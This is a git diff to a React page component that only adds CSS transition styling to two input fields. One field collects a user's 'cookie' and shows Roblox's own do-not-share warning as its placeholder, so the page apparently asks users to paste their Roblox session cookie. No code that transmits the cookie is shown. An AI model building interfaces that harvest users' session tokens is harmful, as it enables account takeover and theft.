@@ -210,8 +210,17 @@ const Index = () => {
         </div>
 
         {/* Cookie input */}
-        <div key={`cookie-${shakeKey}`} className={`relative mb-1 ${errorMsg ? "animate-shake" : ""}`}>
-          <Cookie className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+        <div
+          key={`cookie-${shakeKey}`}
+          className={`relative mb-1 ${errorMsg ? "animate-shake" : ""}`}
+          style={{
+            transition: "transform 450ms cubic-bezier(0.4, 0, 0.2, 1)",
+          }}
+        >
+          <Cookie
+            className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground"
+            style={{ transition: "color 300ms cubic-bezier(0.4, 0, 0.2, 1)" }}
+          />
           <input
             type="text"
             value={cookie}
@@ -219,13 +228,15 @@ const Index = () => {
             placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
             disabled={running}
             maxLength={4000}
-            className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
+            className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 ${
               errorMsg ? "border-destructive" : ""
             }`}
             style={{
               background: "hsl(0 0% 100% / 0.06)",
               backdropFilter: "blur(12px)",
               borderColor: errorMsg ? undefined : "hsl(0 0% 100% / 0.12)",
+              transition:
+                "background-color 350ms cubic-bezier(0.4, 0, 0.2, 1), border-color 350ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 350ms cubic-bezier(0.4, 0, 0.2, 1), transform 450ms cubic-bezier(0.4, 0, 0.2, 1)",
             }}
           />
         </div>
@@ -263,13 +274,15 @@ const Index = () => {
               disabled={running || version !== "v2"}
               tabIndex={version === "v2" ? 0 : -1}
               maxLength={200}
-              className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 transition-colors ${
+              className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 ${
                 errorMsg ? "border-destructive" : ""
               }`}
               style={{
                 background: "hsl(0 0% 100% / 0.06)",
                 backdropFilter: "blur(12px)",
                 borderColor: errorMsg ? undefined : "hsl(0 0% 100% / 0.12)",
+                transition:
+                  "background-color 350ms cubic-bezier(0.4, 0, 0.2, 1), border-color 350ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 350ms cubic-bezier(0.4, 0, 0.2, 1)",
               }}
             />
           </div>
